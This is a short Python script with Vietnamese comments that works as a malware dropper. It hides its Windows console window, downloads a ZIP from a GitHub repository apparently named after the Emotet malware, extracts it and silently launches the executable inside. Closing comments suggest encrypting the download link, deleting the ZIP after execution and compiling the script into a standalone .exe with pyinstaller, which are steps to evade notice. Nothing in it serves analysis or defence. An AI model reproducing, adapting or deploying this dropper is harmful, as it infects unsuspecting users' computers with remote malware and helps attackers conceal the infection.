import ctypes
import zipfile
import os
import subprocess
import requests

def download_file(url):
    response = requests.get(url)
    if response.status_code == 200:
        with open('87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.zip', 'wb') as file:
            file.write(response.content)
        print("File đã được tải xuống thành công.")
    else:
        print(f"Không thể tải file: {response.status_code}")

def unzip_file(zip_file):
    # Giải nén file ZIP mà không có mật khẩu
    with zipfile.ZipFile(zip_file) as zf:
        zf.extractall()  # Không cần pwd
        print("File đã được giải nén thành công.")

def run_executable(exe_path):
    # Chạy file EXE ẩn
    subprocess.Popen(exe_path, shell=True)
    print(f"Đang chạy file: {exe_path}")

if __name__ == "__main__":
    # Ẩn cửa sổ console
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # URL đã cập nhật
    url = "https://github.com/dazepar/test-emotet/raw/refs/heads/main/87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.zip"
    download_file(url)

    # Giải nén file
    try:
        unzip_file('87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.zip')
        
        # Chạy file EXE bên trong file ZIP
        
        exe_name = '87d289e296b3779a744d2ceac8ef592c510b7c6a34157a7f88ba19fa36113fbc.exe'  # Thay đổi theo tên thực tế của file EXE
        if os.path.exists(exe_name):
            run_executable(exe_name)

        
    except (zipfile.BadZipFile, RuntimeError) as e:
        print("Có lỗi xảy ra trong quá trình giải nén:", e)
# có thể custom lại để mã hóa link tải, xóa file zip sau khi thực thi 
# dùng pyinstaller để chuyển .py sang .exe
# pip install pyinstaller
# pyinstaller --onefile pyy.py
